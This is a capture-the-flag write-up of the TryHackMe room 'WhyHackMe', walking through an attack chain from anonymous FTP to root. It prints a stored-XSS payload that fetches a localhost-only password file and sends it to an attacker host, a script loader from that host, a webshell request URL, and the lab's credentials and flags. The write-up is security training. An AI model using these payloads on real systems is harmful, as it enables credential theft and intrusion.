# WhyHackMe 

**Platform:** TryHackMe  
**Date:** 2026-08-29
**Difficulty:** Medium  
**Category:** Web / XSS / OSINT / Network Forensics / Linux Privilege Escalation  
**Status:** ✅ Completed

---

## 📌 What Was This Room About?

WhyHackMe was one of those rooms where you don't just find one vulnerability and finish. The whole thing is basically a chain of different vulnerabilities.

The attack started with **anonymous FTP**, where I found a note pointing towards a file that was only accessible from `localhost`. From there, I found a **stored XSS vulnerability** in the username field and used it to make an administrator's browser request that localhost-only file.

That gave me SSH credentials.

After getting access as `jack`, I discovered that I had `sudo` permissions over `iptables`. This allowed me to remove a firewall rule blocking another port.

The really interesting part came next: there was a PCAP containing traffic to a backdoor, and the server had the TLS private key. I used the key with Wireshark to decrypt the captured traffic and recover the backdoor's URL and parameters.

Finally, I accessed the backdoor, got a shell, and discovered that the compromised web-server account had unrestricted sudo privileges.

Basically:

**Anonymous FTP → Stored XSS → Credential Theft → SSH → iptables → PCAP/TLS Analysis → Webshell → Root**

This room was basically an entire attack chain packed into one machine. 😭

---

# 🔍 1. Reconnaissance

As always, I started with a full Nmap scan because I wanted to know exactly what services were exposed.

```bash
nmap -sV -p- -T4 10.113.167.197
```

### Results

```text
PORT      STATE    SERVICE  VERSION
21/tcp    open     ftp      vsftpd 3.0.3
22/tcp    open     ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.9
80/tcp    open     http     Apache httpd 2.4.41 (Ubuntu)
41312/tcp filtered unknown
```

So we have:

- **21/tcp** → FTP
    
- **22/tcp** → SSH
    
- **80/tcp** → HTTP
    
- **41312/tcp** → filtered service
    

The first thing that stood out to me was FTP, so I checked whether anonymous login was enabled.

```bash
ftp 10.113.167.197
```

I logged in with:

```text
Username: anonymous
Password: anonymous
```

And it actually worked.

I found a file called `update.txt`, so I downloaded it:

```text
get update.txt
```

The file contained:

```text
Hey I just removed the old user mike because that account was compromised
and for any of you who wants the creds of new account visit 127.0.0.1/dir/pass.txt
and don't worry this file is only accessible by localhost (127.0.0.1)
- admin
```

👀 **Okay, that's interesting.**

We now know that there is a file at:

```text
127.0.0.1/dir/pass.txt
```

But there's a problem: it's only accessible from localhost.

So I couldn't just request it directly from my machine.

At this point, I knew I needed some way to make a privileged user or application access it for me.

And that's where the web application came in.

---

# 🌐 2. Web Enumeration

Next, I enumerated the web server to find interesting PHP files.

I used `ffuf`:

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt \
-u "http://10.113.167.197/FUZZ.php" \
-fc 404 -c
```

This gave me several interesting endpoints:

```text
register
login
blog
config
index
```

The `blog` page was especially interesting because it had a comment section.

I created a normal test account and started looking at how the application handled user input.

---

# 🎯 3. Finding Stored XSS

I first tried putting JavaScript into the comment field.

The application was sanitising angle brackets in comments, so something like:

```html
<script>alert(1)</script>
```

wasn't being executed there.

Instead, the HTML was being escaped.

But then I noticed something important.

The **username field wasn't being sanitised in the same way**.

So I registered a test account with:

```html
<script>alert('1')</script>
```

as the username.

I then logged in and posted a comment.

And...

**BOOM. The JavaScript executed.** 💀

That confirmed that the username was being stored and later rendered as HTML without proper output encoding.

So this wasn't just reflected XSS.

It was **stored XSS**.

The payload was saved in the application's database and executed whenever the affected username was rendered.

### Why this mattered

Remember the file I found earlier?

```text
127.0.0.1/dir/pass.txt
```

The whole point of the challenge was basically getting something on the inside to request that file.

Since I now had JavaScript execution in another user's browser context, I could try using JavaScript's `fetch()` function to request the localhost-only resource.

---

# 📡 4. Using XSS to Steal the Credentials

I created a JavaScript file called:

```text
inject.js
```

The basic idea was:

1. Fetch the localhost-only password file.
    
2. Read its contents.
    
3. URL-encode the result.
    
4. Send the data to my own HTTP server.
    

My payload was:

```javascript
fetch('http://127.0.0.1/dir/pass.txt')
  .then(response => response.text())
  .then(data => {
    let attackerServer = 'http://<ATTACKER_IP>:8000/catch?data=' + encodeURIComponent(data);
    let img = document.createElement('img');
    img.src = attackerServer;
    document.body.appendChild(img);
  });
```

I then started a simple Python web server on my machine:

```bash
python3 -m http.server 8000
```

The idea here is pretty clever.

The XSS runs in the victim's browser. That browser makes the request to `127.0.0.1`, and then sends the result back to my server through the image request.

I registered another account and used the JavaScript loader as the username:

```html
<script src=http://<ATTACKER_IP>:8000/inject.js></script>
```

After logging in and posting a comment, I waited for the payload to execute.

Eventually, my Python server received:

```text
jack%3AWhyIsMyPasswordSoStrongIDK%0A
```

I URL-decoded it:

```text
jack:WhyIsMyPasswordSoStrongIDK
```

🎯 **We got credentials.**

So now I had:

```text
Username: jack
Password: WhyIsMyPasswordSoStrongIDK
```

Time to try SSH.

```bash
ssh jack@10.113.167.197
```

And it worked.

---

# 🏁 5. Getting the User Flag

Once I was logged in as `jack`, I checked the user's home directory and grabbed the first flag.

```bash
cat /home/jack/user.txt
```

I got:

```text
1ca4eb201787acbfcf9e70fca87b866a
```

### 🏁 User Flag

```text
1ca4eb201787acbfcf9e70fca87b866a
```

But I wasn't done yet.

I still needed root.

---

# 🔥 6. Checking Sudo Permissions

Whenever I get a shell as a user, one of the first things I check is:

```bash
sudo -l
```

The output showed that `jack` could run `iptables` with sudo.

That was VERY interesting.

I checked the current firewall rules:

```bash
sudo iptables -L
```

I found rules that were blocking TCP port `41312`.

Something like:

```text
DROP tcp -- anywhere anywhere tcp dpt:41312
```

So that explained why Nmap had originally reported port `41312` as **filtered**.

The room also had a file at:

```text
/opt/urgent.txt
```

I read it:

```bash
cat /opt/urgent.txt
```

It explained that the machine had previously been compromised and that files had been placed in:

```text
/usr/lib/cgi-bin/
```

The administrator had tried to stop the attacker by blocking the backdoor's port using iptables.

So now I had a pretty good idea of what I was looking for.

There was supposedly a backdoor.

The firewall was blocking it.

And I had permission to modify the firewall.

---

# 🔓 7. Removing the Firewall Rule

Since I had sudo access to `iptables`, I could flush the current firewall rules:

```bash
sudo iptables -F
```

Now I checked the port again.

The firewall was no longer blocking it.

This was a great example of why **access control matters**.

The administrator had blocked the attacker's network access, but the backdoor itself had apparently not been removed.

So the next question was:

**What exactly was this backdoor?**

Luckily, there was a PCAP.

---

# 🧪 8. Investigating the PCAP

The machine contained:

```text
/opt/capture.pcap
```

I downloaded the PCAP to my machine:

```bash
scp jack@10.113.167.197:/opt/capture.pcap .
```

I also looked at the Apache configuration:

```bash
cat /etc/apache2/sites-available/000-default.conf
```

I found the TLS private key configuration:

```text
SSLCertificateKeyFile /etc/apache2/certs/apache.key
```

So I copied the key to my machine too:

```bash
scp jack@10.113.167.197:/etc/apache2/certs/apache.key .
```

Now I had:

```text
capture.pcap
apache.key
```

This was where things got really interesting.

The PCAP contained encrypted HTTPS traffic to port `41312`.

But I also had the server's private key.

In this challenge's TLS setup, that allowed Wireshark to decrypt the captured traffic.

---

# 🔐 9. Decrypting the Traffic with Wireshark

I opened `capture.pcap` in Wireshark.

Then I went to:

**Edit → Preferences → Protocols → TLS**

I added the recovered private key to the RSA key list.

I didn't need to enter a password.

After that, I filtered the traffic:

```text
tcp.port == 41312 && http
```

I then followed the HTTP stream.

And there it was.

I found a request to:

```text
/cgi-bin/5UP3r53Cr37.py
```

with parameters like:

```text
key=48pfPHUrj4pmHzrC
iv=VZukhsCo8TlTXORN
cmd=id
```

So the backdoor was:

```text
/cgi-bin/5UP3r53Cr37.py
```

And the PCAP had basically handed me the parameters required to interact with it.

This is why network forensics can be so useful during incident response.

Even though the traffic was encrypted, the server's private key and the specific TLS setup in this challenge allowed the captured traffic to be recovered.

---

# 💻 10. Accessing the Backdoor

Now that I had removed the firewall rule and knew the backdoor endpoint, I accessed it.

The request looked like:

```text
https://10.113.167.197:41312/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=id
```

The response was:

```text
uid=33(www-data) gid=1003(h4ck3d) groups=1003(h4ck3d)
```

So the webshell was executing commands as:

```text
www-data
```

That confirmed that the backdoor was real.

---

# 🐚 11. Getting a Reverse Shell

The webshell had a `cmd` parameter, meaning I could use it to execute commands.

I started a listener on my machine:

```bash
nc -lnvp 9001
```

Then I sent a reverse-shell command through the `cmd` parameter.

Once the connection came back, I had a shell on the target.

The shell wasn't very comfortable, so I stabilised it:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Then:

```text
Ctrl+Z
```

and:

```bash
stty raw -echo; fg
export TERM=xterm
```

Now I had a much more usable shell.

---

# 👑 12. Getting Root

At this point, I checked sudo permissions again:

```bash
sudo -l
```

And there it was.

The compromised account had unrestricted sudo privileges.

So becoming root was basically:

```bash
sudo su
```

I checked who I was:

```bash
whoami
```

And I was:

```text
root
```

👑 **ROOT!**

Finally, I grabbed the root flag:

```bash
cat /root/root.txt
```

The flag was:

```text
4dbe2259ae53846441cc2479b5475c72
```

---

# 🚩 Flags Found

|Flag|Value|
|---|---|
|User Flag|`1ca4eb201787acbfcf9e70fca87b866a`|
|Root Flag|`4dbe2259ae53846441cc2479b5475c72`|

---

# 🛠️ Commands Used

|Command|What It Does|
|---|---|
|`nmap -sV -p- -T4 <IP>`|Scans all TCP ports and identifies running services.|
|`ftp <IP>`|Connects to the FTP service.|
|`get update.txt`|Downloads a file from the FTP server.|
|`ffuf ...`|Enumerates web endpoints.|
|`python3 -m http.server 8000`|Starts a simple HTTP server for hosting/catching requests.|
|`ssh jack@<IP>`|Connects to the target through SSH.|
|`cat /home/jack/user.txt`|Reads the user flag.|
|`sudo -l`|Shows commands the current user can run with sudo.|
|`sudo iptables -L`|Displays firewall rules.|
|`sudo iptables -F`|Flushes the current iptables rules.|
|`scp ...`|Copies files between the target and attacker machine.|
|`nc -lnvp 9001`|Starts a Netcat listener for the reverse shell.|
|`python3 -c 'import pty;pty.spawn("/bin/bash")'`|Creates a more usable pseudo-terminal.|
|`sudo su`|Opens a root shell when sudo permissions allow it.|
|`cat /root/root.txt`|Reads the root flag.|

---

# 💡 What I Learned

- **Anonymous FTP can be way more dangerous than it looks.** Even though I didn't immediately get credentials from FTP, the `update.txt` file gave me the exact information I needed for the next stage.
    
- **Stored XSS isn't just about popping an alert.** The real power comes from what the JavaScript can access from the victim's browser context. In this room, it became a way to retrieve information that I couldn't access directly.
    
- **I learned how powerful chaining vulnerabilities can be.** None of the individual steps completely solved the room. The FTP leak led to XSS, XSS led to credentials, credentials led to SSH, SSH led to iptables, and the PCAP led to the backdoor.
    
- **PCAP analysis is seriously useful.** The encrypted traffic initially looked useless, but recovering the appropriate TLS key allowed me to inspect what had actually happened.
    
- **Blocking a port isn't the same as removing a backdoor.** The firewall rule stopped direct access, but the malicious file and its associated privileges were still sitting on the machine.
    
- **`sudo -l` should basically become muscle memory.** Both the `jack` account and the later shell had important privilege information that completely changed the direction of the attack.
    

---

# ❓ What Confused Me / What I Want to Research Next

The part I want to understand better is the **TLS decryption**.

I understand the basic idea now: the PCAP contained encrypted traffic, and the server's private key was available, so Wireshark could decrypt the traffic under the TLS configuration used by the challenge.

But I want to learn more about **RSA key exchange vs. modern ECDHE**, because simply having a server's private key does **not** automatically mean you can decrypt every modern TLS capture.

I also want to learn more about:

- How stored XSS interacts with browser security policies.
    
- Same-Origin Policy and CORS.
    
- How Wireshark handles TLS decryption.
    
- How PCAP analysis can reconstruct an attack.
    
- How `iptables` rules work internally.
    
- How attackers and defenders deal with persistent webshells.
    

---

# 🔗 Linked Notes

- [[Nmap]]
    
- [[FTP Enumeration]]
    
- [[Stored XSS]]
    
- [[JavaScript Fetch]]
    
- [[Credential Exfiltration]]
    
- [[SSH]]
    
- [[iptables]]
    
- [[PCAP Analysis]]
    
- [[Wireshark]]
    
- [[TLS]]
    
- [[Webshells]]
    
- [[Reverse Shell]]
    
- [[Linux Privilege Escalation]]
    
- [[sudo]]
    

---

# 🎯 Conclusion

**WhyHackMe was basically an entire attack chain in one room.**

I started with an anonymous FTP login and a random-looking text file.

That file gave me a localhost-only target.

The web application gave me stored XSS.

The XSS gave me credentials.

The credentials gave me SSH.

SSH gave me access to `iptables`.

`iptables` gave me access to the previously blocked port.

The PCAP + TLS key showed me the hidden backdoor.

The backdoor gave me a shell.

And the sudo configuration gave me **root**.

The biggest thing I took from this room is that real attacks aren't always about finding one massive vulnerability.

Sometimes it's about finding **a bunch of smaller weaknesses and chaining them together until the entire machine falls apart.**

And honestly...

**this room was one hell of a chain. 🗿🔥**